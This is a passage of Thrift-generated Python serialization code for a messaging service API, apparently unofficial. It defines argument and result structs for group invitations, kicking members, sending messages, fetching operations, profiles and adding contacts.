                    self.expirationTime = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 21:
                if ftype == TType.I32:
                    self.maxUseCount = iprot.readI32()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('Ticket')
        if self.id is not None:
            oprot.writeFieldBegin('id', TType.STRING, 1)
            oprot.writeString(self.id.encode('utf-8') if sys.version_info[0] == 2 else self.id)
            oprot.writeFieldEnd()
        if self.expirationTime is not None:
            oprot.writeFieldBegin('expirationTime', TType.I64, 10)
            oprot.writeI64(self.expirationTime)
            oprot.writeFieldEnd()
        if self.maxUseCount is not None:
            oprot.writeFieldBegin('maxUseCount', TType.I32, 21)
            oprot.writeI32(self.maxUseCount)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class cancelGroupInvitation_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRING, 'groupId', 'UTF8', None, ),  # 2
        (3, TType.LIST, 'contactIds', (TType.STRING, 'UTF8', False), None, ),  # 3
    )

    def __init__(self, reqSeq=None, groupId=None, contactIds=None,):
        self.reqSeq = reqSeq
        self.groupId = groupId
        self.contactIds = contactIds

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.groupId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.LIST:
                    self.contactIds = []
                    (_etype1395, _size1392) = iprot.readListBegin()
                    for _i1396 in range(_size1392):
                        _elem1397 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.contactIds.append(_elem1397)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('cancelGroupInvitation_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.groupId is not None:
            oprot.writeFieldBegin('groupId', TType.STRING, 2)
            oprot.writeString(self.groupId.encode('utf-8') if sys.version_info[0] == 2 else self.groupId)
            oprot.writeFieldEnd()
        if self.contactIds is not None:
            oprot.writeFieldBegin('contactIds', TType.LIST, 3)
            oprot.writeListBegin(TType.STRING, len(self.contactIds))
            for iter1398 in self.contactIds:
                oprot.writeString(iter1398.encode('utf-8') if sys.version_info[0] == 2 else iter1398)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class cancelGroupInvitation_result(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )
    
    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('cancelGroupInvitation_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class kickoutFromGroup_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRING, 'groupId', 'UTF8', None, ),  # 2
        (3, TType.LIST, 'contactIds', (TType.STRING, 'UTF8', False), None, ),  # 3
    )

    def __init__(self, reqSeq=None, groupId=None, contactIds=None,):
        self.reqSeq = reqSeq
        self.groupId = groupId
        self.contactIds = contactIds

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.groupId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.LIST:
                    self.contactIds = []
                    (_etype1819, _size1816) = iprot.readListBegin()
                    for _i1820 in range(_size1816):
                        _elem1821 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.contactIds.append(_elem1821)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('kickoutFromGroup_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.groupId is not None:
            oprot.writeFieldBegin('groupId', TType.STRING, 2)
            oprot.writeString(self.groupId.encode('utf-8') if sys.version_info[0] == 2 else self.groupId)
            oprot.writeFieldEnd()
        if self.contactIds is not None:
            oprot.writeFieldBegin('contactIds', TType.LIST, 3)
            oprot.writeListBegin(TType.STRING, len(self.contactIds))
            for iter1822 in self.contactIds:
                oprot.writeString(iter1822.encode('utf-8') if sys.version_info[0] == 2 else iter1822)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class kickoutFromGroup_result(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('kickoutFromGroup_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class inviteIntoGroup_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRING, 'groupId', 'UTF8', None, ),  # 2
        (3, TType.LIST, 'contactIds', (TType.STRING, 'UTF8', False), None, ),  # 3
    )

    def __init__(self, reqSeq=None, groupId=None, contactIds=None,):
        self.reqSeq = reqSeq
        self.groupId = groupId
        self.contactIds = contactIds

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.groupId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.LIST:
                    self.contactIds = []
                    (_etype1805, _size1802) = iprot.readListBegin()
                    for _i1806 in range(_size1802):
                        _elem1807 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.contactIds.append(_elem1807)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('inviteIntoGroup_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.groupId is not None:
            oprot.writeFieldBegin('groupId', TType.STRING, 2)
            oprot.writeString(self.groupId.encode('utf-8') if sys.version_info[0] == 2 else self.groupId)
            oprot.writeFieldEnd()
        if self.contactIds is not None:
            oprot.writeFieldBegin('contactIds', TType.LIST, 3)
            oprot.writeListBegin(TType.STRING, len(self.contactIds))
            for iter1808 in self.contactIds:
                oprot.writeString(iter1808.encode('utf-8') if sys.version_info[0] == 2 else iter1808)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class inviteIntoGroup_result(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('inviteIntoGroup_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class sendMessage_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'seq', None, None, ),  # 1
        (2, TType.STRUCT, 'message', [Message, None], None, ),  # 2
    )

    def __init__(self, seq=None, message=None,):
        self.seq = seq
        self.message = message

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.seq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRUCT:
                    self.message = Message()
                    self.message.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('sendMessage_args')
        if self.seq is not None:
            oprot.writeFieldBegin('seq', TType.I32, 1)
            oprot.writeI32(self.seq)
            oprot.writeFieldEnd()
        if self.message is not None:
            oprot.writeFieldBegin('message', TType.STRUCT, 2)
            self.message.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class sendMessage_result(object):
    
    thrift_spec = (
        (0, TType.STRUCT, 'success', [Message, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Message()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('sendMessage_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class fetchOperations_args(object):
    
    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.I64, 'localRev', None, None, ),  # 2
        (3, TType.I32, 'count', None, None, ),  # 3
    )

    def __init__(self, localRev=None, count=None,):
        self.localRev = localRev
        self.count = count

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.I64:
                    self.localRev = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.I32:
                    self.count = iprot.readI32()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('fetchOperations_args')
        if self.localRev is not None:
            oprot.writeFieldBegin('localRev', TType.I64, 2)
            oprot.writeI64(self.localRev)
            oprot.writeFieldEnd()
        if self.count is not None:
            oprot.writeFieldBegin('count', TType.I32, 3)
            oprot.writeI32(self.count)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class fetchOperations_result(object):
    
    thrift_spec = (
        (0, TType.LIST, 'success', (TType.STRUCT, [Operation, None], False), None, ),  # 0
        (1, TType.STRUCT, 'e', [ShouldSyncException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.LIST:
                    self.success = []
                    (_etype1492, _size1489) = iprot.readListBegin()
                    for _i1493 in range(_size1489):
                        _elem1494 = Operation()
                        _elem1494.read(iprot)
                        self.success.append(_elem1494)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = ShouldSyncException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('fetchOperations_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.LIST, 0)
            oprot.writeListBegin(TType.STRUCT, len(self.success))
            for iter1495 in self.success:
                iter1495.write(oprot)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class getLastOpRevision_args(object):
    
    thrift_spec = ()

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getLastOpRevision_args')
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getLastOpRevision_result(object):
    
    thrift_spec = (
        (0, TType.I64, 'success', None, None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.I64:
                    self.success = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getLastOpRevision_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.I64, 0)
            oprot.writeI64(self.success)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class getProfile_args(object):
    
    thrift_spec = ()

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getProfile_args')
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getProfile_result(object):
    
    thrift_spec = (
        (0, TType.STRUCT, 'success', [Profile, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )
    
    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Profile()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getProfile_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class acceptGroupInvitation_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRING, 'groupId', 'UTF8', None, ),  # 2
    )

    def __init__(self, reqSeq=None, groupId=None,):
        self.reqSeq = reqSeq
        self.groupId = groupId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.groupId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('acceptGroupInvitation_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.groupId is not None:
            oprot.writeFieldBegin('groupId', TType.STRING, 2)
            oprot.writeString(self.groupId.encode('utf-8') if sys.version_info[0] == 2 else self.groupId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class acceptGroupInvitation_result(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('acceptGroupInvitation_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class findAndAddContactsByMid_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRING, 'mid', 'UTF8', None, ),  # 2
        (3, TType.I32, 'type', None, None, ),  # 3
        (4, TType.STRING, 'reference', 'UTF8', None, ),  # 4
    )
    
    def __init__(self, reqSeq=None, mid=None, type=None, reference=None,):
        self.reqSeq = reqSeq
        self.mid = mid
        self.type = type
        self.reference = reference

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.mid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.I32:
                    self.type = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.STRING:
                    self.reference = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('findAndAddContactsByMid_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.mid is not None:
            oprot.writeFieldBegin('mid', TType.STRING, 2)
            oprot.writeString(self.mid.encode('utf-8') if sys.version_info[0] == 2 else self.mid)
            oprot.writeFieldEnd()
        if self.type is not None:
            oprot.writeFieldBegin('type', TType.I32, 3)
            oprot.writeI32(self.type)
            oprot.writeFieldEnd()
        if self.reference is not None:
            oprot.writeFieldBegin('reference', TType.STRING, 4)
            oprot.writeString(self.reference.encode('utf-8') if sys.version_info[0] == 2 else self.reference)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class findAndAddContactsByMid_result(object):
    
    thrift_spec = (
        (0, TType.MAP, 'success', (TType.STRING, 'UTF8', TType.STRUCT, [Contact, None], False), None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.MAP:
                    self.success = {}
                    (_ktype1520, _vtype1521, _size1519) = iprot.readMapBegin()
                    for _i1523 in range(_size1519):
                        _key1524 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        _val1525 = Contact()
                        _val1525.read(iprot)
                        self.success[_key1524] = _val1525
                    iprot.readMapEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('findAndAddContactsByMid_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.MAP, 0)
            oprot.writeMapBegin(TType.STRING, TType.STRUCT, len(self.success))
            for kiter1526, viter1527 in self.success.items():
                oprot.writeString(kiter1526.encode('utf-8') if sys.version_info[0] == 2 else kiter1526)
                viter1527.write(oprot)
            oprot.writeMapEnd()
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class leaveGroup_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRING, 'groupId', 'UTF8', None, ),  # 2
    )
    
    def __init__(self, reqSeq=None, groupId=None,):
        self.reqSeq = reqSeq
        self.groupId = groupId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.groupId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('leaveGroup_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.groupId is not None:
